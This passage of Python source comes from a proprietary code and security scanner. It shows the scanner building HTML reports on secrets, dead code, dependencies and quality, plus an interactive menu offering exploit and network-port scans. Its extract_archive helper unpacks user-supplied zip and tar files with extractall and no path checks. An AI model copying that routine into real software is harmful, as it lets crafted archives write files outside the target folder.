            fsmap_html = '<h2 style="color:#4ade80;margin-top:30px;border-bottom:2px solid #4ade80;padding-bottom:8px;">DEEP FILE SYSTEM MAP</h2>'
            fsmap_html += f'''<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;">
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#4ade80;font-weight:bold;">{fm.get("total_files",0):,}</div><div style="color:#888;font-size:11px;">Total Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#4ade80;font-weight:bold;">{fm.get("total_dirs",0):,}</div><div style="color:#888;font-size:11px;">Directories</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#d4a017;font-weight:bold;">{fm.get("total_size_human","?")}</div><div style="color:#888;font-size:11px;">Total Size</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#d4a017;font-weight:bold;">{fm.get("max_depth",0)}</div><div style="color:#888;font-size:11px;">Max Depth</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{fm.get("hidden_files",0)}</div><div style="color:#888;font-size:11px;">Hidden Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{fm.get("duplicate_file_groups",0)}</div><div style="color:#888;font-size:11px;">Duplicate Groups</div></div>
</div>'''
            if fm.get("file_type_distribution"):
                fsmap_html += '<details style="margin:10px 0;"><summary style="color:#d4a017;cursor:pointer;font-weight:bold;">File Type Distribution</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for ext, cnt in list(fm["file_type_distribution"].items())[:30]:
                    fsmap_html += f'<div style="color:#ccc;font-size:12px;font-family:monospace;">{self._esc(ext):15s} {cnt:,}</div>'
                fsmap_html += '</div></details>'
            if fm.get("largest_files"):
                fsmap_html += '<details style="margin:10px 0;"><summary style="color:#d4a017;cursor:pointer;font-weight:bold;">Largest Files (Top 25)</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for lf in fm["largest_files"]:
                    fsmap_html += f'<div style="color:#ccc;font-size:12px;font-family:monospace;">{lf["size"]:>10s}  {self._esc(lf["path"])}</div>'
                fsmap_html += '</div></details>'
            if fm.get("hidden_file_list"):
                fsmap_html += f'<details style="margin:10px 0;"><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">Hidden Files ({len(fm["hidden_file_list"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for hf in fm["hidden_file_list"]:
                    fsmap_html += f'<div style="color:#ff8800;font-size:12px;font-family:monospace;">{self._esc(hf)}</div>'
                fsmap_html += '</div></details>'
            if fm.get("empty_files"):
                fsmap_html += f'<details style="margin:10px 0;"><summary style="color:#888;cursor:pointer;font-weight:bold;">Empty Files ({len(fm["empty_files"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for ef in fm["empty_files"]:
                    fsmap_html += f'<div style="color:#888;font-size:12px;font-family:monospace;">{self._esc(ef)}</div>'
                fsmap_html += '</div></details>'
            if fm.get("duplicate_files"):
                fsmap_html += f'<details style="margin:10px 0;"><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">Duplicate File Groups ({len(fm["duplicate_files"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for h, paths in list(fm["duplicate_files"].items())[:20]:
                    fsmap_html += f'<div style="color:#ff4444;font-size:12px;font-weight:bold;margin-top:8px;">Group (hash: {h[:12]}...):</div>'
                    for p in paths:
                        fsmap_html += f'<div style="color:#ccc;font-size:12px;font-family:monospace;margin-left:16px;">{self._esc(p)}</div>'
                fsmap_html += '</div></details>'

        depweb_html = ""
        if self.depweb_results:
            dw = self.depweb_results
            depweb_html = '<h2 style="color:#8b5cf6;margin-top:30px;border-bottom:2px solid #8b5cf6;padding-bottom:8px;">DEPENDENCY WEB — Full Import Graph</h2>'
            depweb_html += f'''<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;">
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#8b5cf6;font-weight:bold;">{dw.get("total_source_files",0):,}</div><div style="color:#888;font-size:11px;">Source Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#8b5cf6;font-weight:bold;">{dw.get("total_import_links",0):,}</div><div style="color:#888;font-size:11px;">Import Links</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:1px solid #ff4444;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{len(dw.get("circular_dependencies",[]))}</div><div style="color:#888;font-size:11px;">Circular Deps</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{len(dw.get("isolated_files",[]))}</div><div style="color:#888;font-size:11px;">Isolated Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{len(dw.get("dead_modules",[]))}</div><div style="color:#888;font-size:11px;">Dead Modules</div></div>
</div>'''
            if dw.get("circular_dependencies"):
                depweb_html += f'<details style="margin:10px 0;"><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">Circular Dependencies ({len(dw["circular_dependencies"])})</summary><div style="background:#1a0000;padding:10px;border-radius:4px;margin-top:5px;">'
                for cd in dw["circular_dependencies"][:15]:
                    depweb_html += f'<div style="color:#ff4444;font-size:12px;margin:4px 0;">{" → ".join(self._esc(str(c)) for c in cd)}</div>'
                depweb_html += '</div></details>'
            if dw.get("isolated_files"):
                depweb_html += f'<details style="margin:10px 0;"><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">Isolated Files — No Imports, Not Imported ({len(dw["isolated_files"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for iso in dw["isolated_files"][:40]:
                    depweb_html += f'<div style="color:#ff8800;font-size:12px;font-family:monospace;">{self._esc(iso)}</div>'
                depweb_html += '</div></details>'
            if dw.get("dead_modules"):
                depweb_html += f'<details style="margin:10px 0;"><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">Dead Modules — Never Imported ({len(dw["dead_modules"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for dm in dw["dead_modules"][:40]:
                    depweb_html += f'<div style="color:#ff8800;font-size:12px;font-family:monospace;">{self._esc(dm)}</div>'
                depweb_html += '</div></details>'
            if dw.get("most_imported"):
                depweb_html += '<details style="margin:10px 0;"><summary style="color:#4ade80;cursor:pointer;font-weight:bold;">Most Imported (Hub Files)</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for name, cnt in dw["most_imported"]:
                    depweb_html += f'<div style="color:#4ade80;font-size:12px;font-family:monospace;">{cnt:4d}x  {self._esc(name)}</div>'
                depweb_html += '</div></details>'

        deadcode_html = ""
        if self.deadcode_results:
            dc = self.deadcode_results
            deadcode_html = '<h2 style="color:#ef4444;margin-top:30px;border-bottom:2px solid #ef4444;padding-bottom:8px;">DEAD CODE &amp; UNREACHABLE PATH ANALYSIS</h2>'
            deadcode_html += f'''<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;">
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:1px solid #ef4444;"><div style="font-size:24px;color:#ef4444;font-weight:bold;">{dc.get("dead_function_count",0)}</div><div style="color:#888;font-size:11px;">Dead Functions</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:1px solid #ff8800;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{dc.get("unreachable_count",0)}</div><div style="color:#888;font-size:11px;">Unreachable Code</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ffcc00;font-weight:bold;">{len(dc.get("empty_functions",[]))}</div><div style="color:#888;font-size:11px;">Empty Functions</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#4488ff;font-weight:bold;">{dc.get("todo_count",0)}</div><div style="color:#888;font-size:11px;">TODO/FIXME</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{len(dc.get("empty_catch_blocks",[]))}</div><div style="color:#888;font-size:11px;">Empty Catches</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#888;font-weight:bold;">{len(dc.get("commented_code_blocks",[]))}</div><div style="color:#888;font-size:11px;">Commented Code</div></div>
</div>'''
            if dc.get("dead_functions"):
                deadcode_html += f'<details style="margin:10px 0;" open><summary style="color:#ef4444;cursor:pointer;font-weight:bold;">Dead Functions — Defined But Never Called ({dc["dead_function_count"]})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for df in dc["dead_functions"][:60]:
                    deadcode_html += f'<div style="color:#ef4444;font-size:12px;font-family:monospace;margin:2px 0;"><span style="color:#ff4444;">✗</span> {self._esc(df["name"])}() — {self._esc(df["file"])}:{df["line"]}</div>'
                deadcode_html += '</div></details>'
            if dc.get("unreachable_code"):
                deadcode_html += f'<details style="margin:10px 0;" open><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">Unreachable Code — Code After return/throw/exit ({dc["unreachable_count"]})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for uc in dc["unreachable_code"][:40]:
                    deadcode_html += f'<div style="border-left:3px solid #ff8800;padding:4px 8px;margin:4px 0;"><div style="color:#ff8800;font-size:12px;font-family:monospace;">{self._esc(uc["file"])}:{uc["line"]}</div><div style="color:#888;font-size:11px;">After: {self._esc(uc["after"])}</div><div style="color:#ccc;font-size:11px;">→ {self._esc(uc["code"])}</div></div>'
                deadcode_html += '</div></details>'
            if dc.get("todo_fixme"):
                deadcode_html += f'<details style="margin:10px 0;"><summary style="color:#4488ff;cursor:pointer;font-weight:bold;">TODO / FIXME / HACK Comments ({dc["todo_count"]})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for td in dc["todo_fixme"][:50]:
                    c = "#ff4444" if td["type"] in ("FIXME", "BUG", "HACK") else "#4488ff"
                    deadcode_html += f'<div style="color:{c};font-size:12px;margin:2px 0;font-family:monospace;">[{td["type"]}] {self._esc(td["file"])}:{td["line"]} — {self._esc(td["text"])}</div>'
                deadcode_html += '</div></details>'
            if dc.get("empty_catch_blocks"):
                deadcode_html += f'<details style="margin:10px 0;"><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">Empty Catch Blocks — Swallowed Errors ({len(dc["empty_catch_blocks"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for ec in dc["empty_catch_blocks"][:30]:
                    deadcode_html += f'<div style="color:#ff4444;font-size:12px;font-family:monospace;">{self._esc(ec["file"])}:{ec["line"]}</div>'
                deadcode_html += '</div></details>'

        config_html = ""
        if self.config_results:
            cf = self.config_results
            deadcode_html_any = cf.get("exposed_secret_count", 0) + len(cf.get("sensitive_files", [])) + len(cf.get("world_writable_files", []))
            config_html = '<h2 style="color:#f59e0b;margin-top:30px;border-bottom:2px solid #f59e0b;padding-bottom:8px;">CONFIGURATION &amp; SECRET AUDIT</h2>'
            config_html += f'''<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;">
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:1px solid #ff4444;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{cf.get("exposed_secret_count",0)}</div><div style="color:#888;font-size:11px;">Exposed Secrets</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#f59e0b;font-weight:bold;">{cf.get("sensitive_file_count",0)}</div><div style="color:#888;font-size:11px;">Sensitive Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{len(cf.get("high_entropy_strings",[]))}</div><div style="color:#888;font-size:11px;">High Entropy</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:1px solid #ff4444;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{len(cf.get("world_writable_files",[]))}</div><div style="color:#888;font-size:11px;">World-Writable</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#888;font-weight:bold;">{cf.get("backup_file_count",0)}</div><div style="color:#888;font-size:11px;">Backup Files</div></div>
</div>'''
            if cf.get("exposed_secrets"):
                config_html += f'<details style="margin:10px 0;" open><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">Exposed Secrets &amp; Credentials ({cf["exposed_secret_count"]})</summary><div style="background:#1a0000;padding:10px;border-radius:4px;margin-top:5px;">'
                for s in cf["exposed_secrets"][:50]:
                    config_html += f'<div style="border-left:3px solid #ff4444;padding:4px 8px;margin:4px 0;"><div style="color:#ff4444;font-size:13px;font-weight:bold;">{self._esc(s["type"])}</div><div style="color:#888;font-size:12px;font-family:monospace;">{self._esc(s["file"])}:{s["line"]}</div><div style="color:#666;font-size:11px;">Preview: {self._esc(s["preview"])}</div></div>'
                config_html += '</div></details>'
            if cf.get("sensitive_files"):
                config_html += f'<details style="margin:10px 0;"><summary style="color:#f59e0b;cursor:pointer;font-weight:bold;">Sensitive Files Found ({cf["sensitive_file_count"]})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for sf in cf["sensitive_files"][:40]:
                    config_html += f'<div style="color:#f59e0b;font-size:12px;font-family:monospace;">{self._esc(sf)}</div>'
                config_html += '</div></details>'
            if cf.get("high_entropy_strings"):
                config_html += f'<details style="margin:10px 0;"><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">High Entropy Strings — Possible Encoded Secrets ({len(cf["high_entropy_strings"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for he in cf["high_entropy_strings"][:30]:
                    config_html += f'<div style="color:#ff8800;font-size:12px;font-family:monospace;">Entropy={he["entropy"]} | {self._esc(he["file"])}:{he["line"]} | {self._esc(he["preview"])}</div>'
                config_html += '</div></details>'
            if cf.get("world_writable_files"):
                config_html += f'<details style="margin:10px 0;"><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">World-Writable Files ({len(cf["world_writable_files"])})</summary><div style="background:#1a0000;padding:10px;border-radius:4px;margin-top:5px;">'
                for ww in cf["world_writable_files"][:30]:
                    config_html += f'<div style="color:#ff4444;font-size:12px;font-family:monospace;">{self._esc(ww)}</div>'
                config_html += '</div></details>'

        quality_html = ""
        if self.quality_results:
            qq = self.quality_results
            score = qq.get("overall_quality_score", 0)
            score_color = "#4ade80" if score >= 70 else "#ffcc00" if score >= 40 else "#ff4444"
            quality_html = '<h2 style="color:#06b6d4;margin-top:30px;border-bottom:2px solid #06b6d4;padding-bottom:8px;">CODE QUALITY ANALYSIS</h2>'
            quality_html += f'''<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;">
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;border:2px solid {score_color};"><div style="font-size:32px;color:{score_color};font-weight:bold;">{score}/100</div><div style="color:#888;font-size:11px;">Quality Score</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#06b6d4;font-weight:bold;">{qq.get("files_analyzed",0):,}</div><div style="color:#888;font-size:11px;">Files Analyzed</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff8800;font-weight:bold;">{len(qq.get("high_complexity_files",[]))}</div><div style="color:#888;font-size:11px;">High Complexity</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#ff4444;font-weight:bold;">{len(qq.get("god_files",[]))}</div><div style="color:#888;font-size:11px;">God Files</div></div>
<div style="background:#111;padding:14px;border-radius:8px;text-align:center;"><div style="font-size:24px;color:#888;font-weight:bold;">{qq.get("magic_number_count",0)}</div><div style="color:#888;font-size:11px;">Magic Numbers</div></div>
</div>'''
            if qq.get("god_files"):
                quality_html += f'<details style="margin:10px 0;" open><summary style="color:#ff4444;cursor:pointer;font-weight:bold;">God Files — Massive, Over-Responsible ({len(qq["god_files"])})</summary><div style="background:#1a0000;padding:10px;border-radius:4px;margin-top:5px;">'
                for gf in qq["god_files"]:
                    quality_html += f'<div style="border-left:3px solid #ff4444;padding:4px 8px;margin:4px 0;"><div style="color:#ff4444;font-size:13px;font-weight:bold;">{self._esc(gf["file"])}</div><div style="color:#888;font-size:12px;">{gf["lines"]:,} lines | {gf["functions"]} functions | {gf["imports"]} imports</div></div>'
                quality_html += '</div></details>'
            if qq.get("high_complexity_files"):
                quality_html += '<details style="margin:10px 0;"><summary style="color:#ff8800;cursor:pointer;font-weight:bold;">High Complexity Files</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for hc in qq["high_complexity_files"][:20]:
                    quality_html += f'<div style="color:#ff8800;font-size:12px;font-family:monospace;">CC={hc["cyclomatic_complexity"]:4d} | {hc["lines"]:,} lines | {self._esc(hc["file"])}</div>'
                quality_html += '</div></details>'
            if qq.get("deeply_nested_code"):
                quality_html += f'<details style="margin:10px 0;"><summary style="color:#ffcc00;cursor:pointer;font-weight:bold;">Deeply Nested Code (depth >= 6) ({len(qq["deeply_nested_code"])})</summary><div style="background:#0a0a0a;padding:10px;border-radius:4px;margin-top:5px;">'
                for dn in qq["deeply_nested_code"][:30]:
                    quality_html += f'<div style="color:#ffcc00;font-size:12px;font-family:monospace;">depth={dn["depth"]} | {self._esc(dn["file"])}:{dn["line"]} | {self._esc(dn["code"])}</div>'
                quality_html += '</div></details>'

        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Alpha Universal Scanner™ Report</title>
<style>
body {{ background:#0a0a0a; color:#fff; font-family:'Segoe UI',Arial,sans-serif; padding:20px; max-width:1400px; margin:0 auto; line-height:1.6; }}
details > summary {{ font-weight:bold; }}
::-webkit-scrollbar {{ width:8px; }}
::-webkit-scrollbar-track {{ background:#111; }}
::-webkit-scrollbar-thumb {{ background:#333; border-radius:4px; }}
@media print {{ body {{ background:#fff; color:#000; }} }}
</style>
</head>
<body>
<div style="text-align:center;border-bottom:2px solid #d4a017;padding-bottom:20px;margin-bottom:30px;">
<div style="font-size:11px;color:#d4a017;letter-spacing:4px;margin-bottom:8px;">ALPHA UNLIMITED TECHNOLOGIES — PROPRIETARY AND CONFIDENTIAL</div>
<h1 style="margin:10px 0;font-size:28px;">Alpha Universal Scanner™ Report</h1>
<div style="color:#888;font-size:14px;">Code · Network · Security — Unified Analysis</div>
<div style="color:#666;font-size:12px;margin-top:8px;">Generated: {scan_date} | Duration: {duration:.1f}s | Target: {self._esc(str(self.target_path) if self.target_path else "N/A")}</div>
</div>

<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:30px;">
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #222;">
<div style="font-size:28px;color:#4ade80;font-weight:bold;">{self.stats["files_scanned"]:,}</div>
<div style="color:#888;font-size:12px;">Files Scanned</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #222;">
<div style="font-size:28px;color:#4ade80;font-weight:bold;">{self.stats["total_lines"]:,}</div>
<div style="color:#888;font-size:12px;">Lines of Code</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #ff2222;">
<div style="font-size:28px;color:#ff2222;font-weight:bold;">{self.stats["severity_counts"].get(SEVERITY_CRITICAL, 0)}</div>
<div style="color:#888;font-size:12px;">Critical</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #ff8800;">
<div style="font-size:28px;color:#ff8800;font-weight:bold;">{self.stats["severity_counts"].get(SEVERITY_HIGH, 0)}</div>
<div style="color:#888;font-size:12px;">High</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #ffcc00;">
<div style="font-size:28px;color:#ffcc00;font-weight:bold;">{self.stats["severity_counts"].get(SEVERITY_MEDIUM, 0)}</div>
<div style="color:#888;font-size:12px;">Medium</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #4488ff;">
<div style="font-size:28px;color:#4488ff;font-weight:bold;">{self.stats["severity_counts"].get(SEVERITY_LOW, 0)}</div>
<div style="color:#888;font-size:12px;">Low</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #222;">
<div style="font-size:28px;color:#888;font-weight:bold;">{self.stats["severity_counts"].get(SEVERITY_INFO, 0)}</div>
<div style="color:#888;font-size:12px;">Info</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #222;">
<div style="font-size:28px;color:#d4a017;font-weight:bold;">{len(connected_findings)}</div>
<div style="color:#888;font-size:12px;">Connected Bugs</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #ff2222;">
<div style="font-size:28px;color:#ff2222;font-weight:bold;">{self.stats["exploits_found"]}</div>
<div style="color:#888;font-size:12px;">Exploits Found</div></div>
<div style="background:#111;padding:18px;border-radius:8px;text-align:center;border:1px solid #ff8800;">
<div style="font-size:28px;color:#ff8800;font-weight:bold;">{self.stats["exploit_chains_found"]}</div>
<div style="color:#888;font-size:12px;">Exploit Chains</div></div>
</div>

<div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:30px;">
<div style="background:#111;padding:15px;border-radius:8px;">
<div style="color:#d4a017;font-weight:bold;margin-bottom:8px;">Languages Detected ({len(self.stats["languages"])})</div>
<table style="width:100%;">{lang_rows}</table>
</div>
<div style="background:#111;padding:15px;border-radius:8px;">
<div style="color:#d4a017;font-weight:bold;margin-bottom:8px;">Scan Configuration</div>
<div style="color:#ccc;font-size:13px;">Deep Analysis: {"✅ Enabled" if self.deep_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Exploit Scan: {"✅ Enabled" if self.exploit_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Network Scan: {"✅ Enabled" if self.network_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Security Audit: {"✅ Enabled" if self.security_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">FS Mapper: {"✅ Enabled" if self.fsmap_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Dependency Web: {"✅ Enabled" if self.depweb_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Dead Code: {"✅ Enabled" if self.deadcode_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Config Audit: {"✅ Enabled" if self.config_audit else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Quality Scan: {"✅ Enabled" if self.quality_scan else "❌ Disabled"}</div>
<div style="color:#ccc;font-size:13px;">Total Findings: {sum(self.stats["severity_counts"].values()):,}</div>
<div style="color:#ccc;font-size:13px;">Patterns Loaded: {sum(len(v) for v in ALL_PATTERNS.values()) + len(UNIVERSAL_PATTERNS)}</div>
</div>
</div>

{conn_summary}

{exploit_chain_html}

{findings_html}

{wiring_html}

{network_html}

{fsmap_html}

{depweb_html}

{deadcode_html}

{config_html}

{quality_html}

<div style="text-align:center;border-top:2px solid #333;padding-top:20px;margin-top:40px;">
<div style="color:#d4a017;font-size:11px;letter-spacing:2px;">PROPRIETARY AND CONFIDENTIAL — CONTAINS TRADE SECRETS</div>
<div style="color:#666;font-size:11px;margin-top:8px;">© 2024-2026 Alpha Unlimited Technologies LLC. All Rights Reserved Worldwide in Perpetuity. Patent Pending.</div>
<div style="color:#444;font-size:10px;margin-top:4px;">Alpha Universal Scanner™ is proprietary technology of Alpha Unlimited Technologies LLC.</div>
</div>
</body></html>'''

        with open(output_path, "w") as f:
            f.write(html)
        print(f"  HTML report: {output_path}")

    def _esc(self, text):
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def extract_archive(archive_path):
    extract_dir = tempfile.mkdtemp(prefix="alpha_scan_")
    archive_path = Path(archive_path)

    if archive_path.suffix == ".zip" or archive_path.name.endswith(".zip"):
        print(f"  [UNZIP] Extracting {archive_path.name}...", end="", flush=True)
        with zipfile.ZipFile(str(archive_path), "r") as zf:
            zf.extractall(extract_dir)
        print(f" done ({len(os.listdir(extract_dir))} items)")
    elif archive_path.suffix in (".gz", ".tgz", ".bz2", ".xz") or ".tar" in archive_path.name:
        print(f"  [UNTAR] Extracting {archive_path.name}...", end="", flush=True)
        with tarfile.open(str(archive_path), "r:*") as tf:
            tf.extractall(extract_dir)
        print(f" done ({len(os.listdir(extract_dir))} items)")
    elif archive_path.suffix == ".7z":
        print("  [ERROR] .7z files require the 'py7zr' package: pip install py7zr")
        return None
    elif archive_path.suffix == ".rar":
        print("  [ERROR] .rar files require the 'rarfile' package: pip install rarfile")
        return None
    else:
        print(f"  [ERROR] Unsupported archive format: {archive_path.suffix}")
        return None

    items = os.listdir(extract_dir)
    if len(items) == 1 and (Path(extract_dir) / items[0]).is_dir():
        return str(Path(extract_dir) / items[0])
    return extract_dir


def run_interactive():
    _v_rt()
    print(BANNER)
    print("  ┌──────────────────────────────────────────────────┐")
    print("  │         INTERACTIVE MODE — MAIN MENU             │")
    print("  └──────────────────────────────────────────────────┘")
    print()
    print("  What would you like to scan?")
    print()
    print("    [1]  Scan a folder (code + exploits + dead code + deps)")
    print("    [2]  Scan a ZIP / TAR / archive file (auto-extracts)")
    print("    [3]  Full scan (code + exploits + security + fs map + deps + dead code + config + quality)")
    print("    [4]  Network scan only (ports, services, MAC)")
    print("    [5]  Security + config audit only")
    print("    [6]  Exploit scan only")
    print("    [7]  EVERYTHING (all 10 scan modules on a target)")
    print("    [0]  Exit")
    print()

    try:
        choice = input("  Enter choice [0-7]: ").strip()
    except (KeyboardInterrupt, EOFError):
        print("\n  Goodbye.")
        sys.exit(0)

    if choice == "0":
        print("  Goodbye.")
        sys.exit(0)

    target_path = None
    do_deep = False
    do_exploit = False
    do_network = False
    do_security = False
    do_fsmap = False
    do_depweb = False
    do_deadcode = False
    do_config = False
    do_quality = False
    network_target = "127.0.0.1"
    lang_filter = None
    output_path = None

    if choice == "4":
        try:
            network_target = input("  Target IP address [127.0.0.1]: ").strip() or "127.0.0.1"
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        do_network = True
    elif choice in ("1", "2", "3", "5", "6", "7"):
        try:
            target_input = input("  Path to folder or archive file: ").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)

        if not target_input:
            print("  Error: No path provided.")
            sys.exit(1)

        target_input = target_input.strip('"').strip("'")
        target_p = Path(target_input)

        if not target_p.exists():
            print(f"  Error: Path does not exist: {target_input}")
            sys.exit(1)

        if target_p.is_file():
            if target_p.suffix.lower() in (".zip", ".tar", ".gz", ".tgz", ".bz2", ".xz", ".7z", ".rar") or ".tar" in target_p.name.lower():
                target_path = extract_archive(target_p)
                if not target_path:
                    sys.exit(1)
            else:
                parent_dir = tempfile.mkdtemp(prefix="alpha_scan_single_")
                shutil.copy2(str(target_p), parent_dir)
                target_path = parent_dir
        else:
            target_path = str(target_p)

        if choice == "1":
            do_deep = True
            do_exploit = True
            do_deadcode = True
            do_depweb = True
        elif choice == "2":
            do_deep = True
            do_exploit = True
            do_deadcode = True
            do_depweb = True
        elif choice == "3":
            do_deep = True
            do_exploit = True
            do_security = True
            do_fsmap = True
            do_depweb = True
            do_deadcode = True
            do_config = True
            do_quality = True
        elif choice == "5":
            do_security = True
            do_config = True
        elif choice == "6":
            do_exploit = True
            do_deep = True
        elif choice == "7":
            do_deep = True
            do_exploit = True
            do_network = True
            do_security = True
            do_fsmap = True
            do_depweb = True
            do_deadcode = True
            do_config = True
            do_quality = True
            try:
                network_target = input("  Network target IP [127.0.0.1]: ").strip() or "127.0.0.1"
            except (KeyboardInterrupt, EOFError):
                pass

        if choice != "5":
            try:
                lang_input = input("  Filter language? (e.g., cpp, python, javascript — or press Enter for ALL): ").strip().lower()
                if lang_input and lang_input in LANG_EXTENSIONS:
                    lang_filter = lang_input
                elif lang_input:
                    print(f"  Unknown language '{lang_input}', scanning ALL languages.")
            except (KeyboardInterrupt, EOFError):
                pass

    try:
        output_input = input("  Output file path (or press Enter for auto): ").strip()
        if output_input:
            output_path = output_input.strip('"').strip("'")
    except (KeyboardInterrupt, EOFError):
        pass

    scanner = AlphaUniversalScanner(
        target_path=target_path,
        lang_filter=lang_filter,
        deep_scan=do_deep,
        network_scan=do_network,
        network_target=network_target,
        security_scan=do_security,
        exploit_scan=do_exploit,
        fsmap_scan=do_fsmap,
        depweb_scan=do_depweb,
        deadcode_scan=do_deadcode,
        config_audit=do_config,
        quality_scan=do_quality,
    )
    scanner.scan()

    if output_path:
        out = Path(output_path)
        if out.suffix == ".json":
            scanner.export_json(str(out))
        else:
            scanner.export_html(str(out))
    else:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        scanner.export_html(f"alpha_scan_report_{ts}.html")
        scanner.export_json(f"alpha_scan_report_{ts}.json")

    print("\n  Scan complete. Open the HTML report in your browser to review all findings.")

